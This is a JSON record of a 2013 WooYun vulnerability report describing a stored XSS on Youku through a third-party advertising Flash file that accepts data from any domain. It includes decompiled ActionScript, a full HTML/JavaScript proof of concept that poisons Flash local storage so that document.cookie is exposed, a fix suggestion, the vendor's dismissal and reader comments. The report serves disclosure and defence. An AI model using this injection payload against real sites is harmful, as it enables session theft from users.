{"id": 8844, "wybug_id": "wooyun-2013-039670", "wybug_title": "优酷分站一个存储型XSS漏洞", "wybug_corp": "优酷", "wybug_author": "neobyte", "wybug_date": "2013-10-14 11:29", "wybug_open_date": "2013-10-19 11:30", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "利用技巧", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 优酷主站一个存储XSS 详细说明：  在访问youku,查看任意带广告的视频时,都会去调用一个MTFlashStore.swf的回调函数jGetItem.看看这个jGetItem的实现代码:\npublic function init(){    var ret:* = null;    Security.allowDomain(\"*\");    Security.allowInsecureDomain(\"*\");    var params:* = root.loaderInfo.parameters;    this.jsProxyFunction = params.jsproxyfunction;    try {        this.so = SharedObject.getLocal(\"mt_adtracker\", \"/\");    } catch(e) {        sendJSError(\"创建FSO失败,可能用户禁用了Flash本地存储!\");    };......    ExternalInterface.addCallback(\"jGetItem\", function (_arg1, _arg2):void{\tExternalInterface.call(jsProxyFunction, \"onecall\", _arg2, so.data[_arg1]);    });......\n该Flash未进行Security.allowDomain的限制. 那么任意第三方都可以修改LSO中的数据,而LSO->用户存储->ExternalInterface.call,就导致存储XSS.访问下面的POC代码,再观看任意带广告的Youku视频,例如:http://v.youku.com/v_show/id_XNjIwNDI2NDI0.html?f=20383529&ev=1就会触发XSS.\n<html><body><object id=\"MTFlashStore\" tabindex=\"-1\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"1\" height=\"1\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">       <param name=\"movie\" value=\"http://irs01.net/MTFlashStore.swf\">       <param name=\"allowScriptAccess\" value=\"always\">       <param name=\"flashvars\" value=\"jsproxyfunction=test\">       <embed name=\"MTFlashStore\" src=\"http://irs01.net/MTFlashStore.swf\" width=\"1\" height=\"1\" allowscriptaccess=\"always\" flashvars=\"jsproxyfunction=test\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.adobe.com/go/getflashplayer\"></object><script>function test(cmd,data){     if(cmd==\"load\"){     \tvar ua = navigator.userAgent.toLowerCase();       \tif(ua.match(/msie ([\\d.]+)/))document['MTFlashStore'].jSetItem('_iwt_id','\\\\\")));}catch(e){alert(document.cookie);}//','0');     \telse document['MTFlashStore'].jSetItem('_iwt_id','\\\\\"));alert(document.cookie);}catch(e){}//','0');     }     if(cmd==\"onecall\"){           alert('ok');     }     if(cmd==\"error\"){     \talert(data);     }  }</script></body></html>\n注:经过baidu, 了解到这个irs01.net可能是来自艾瑞(iResearch,互联网数据分析),但因为优酷受到影响,故报告到优酷(抱歉打扰了,:-))   漏洞证明：  1. chrome下\n\n2.IE下,顺便看看域名\n\n   修复方案：  建议对来自LSO中的数据进行检查.或者严格限制Security.allowDomain注意:这里不能简单地修补jGetItem为读取并返回LSO,而不调用ExternalInterface.call, 那样同样会导致XSS.    版权声明：转载请注明来源 neobyte@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-19 11:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-14 12:16 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  是搜库那个么 = =?    \n     2013-10-14 13:00 |    \t\tneobyte \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:11        )\t\t \n  @MeirLin 不是,观看视频触发的    \n     2013-10-14 13:52 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  @neobyte 那就坐等忽略了    \n     2013-10-14 17:56 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  危害等级：无影响厂商忽略    \n     2014-09-12 13:04 |    \t\tneobyte \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:11        )\t\t \n  终于平反了。。。二哥的演讲很精彩！    \n     2014-09-14 00:37 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  二哥用这个漏洞攻击了整个视频网络的xss。。。    \n     2014-09-15 14:02 |    \t\tJam \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | I'm CJ!)\t\t \n  搞不懂为什么是「无影响厂商忽略」。。。    \n     2014-11-14 23:00 |    \t\t鬼五 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:83        )\t\t \n  大牛哥哥球带    \n     2014-12-12 21:40 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  看了二哥的ppt，前来跪拜    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}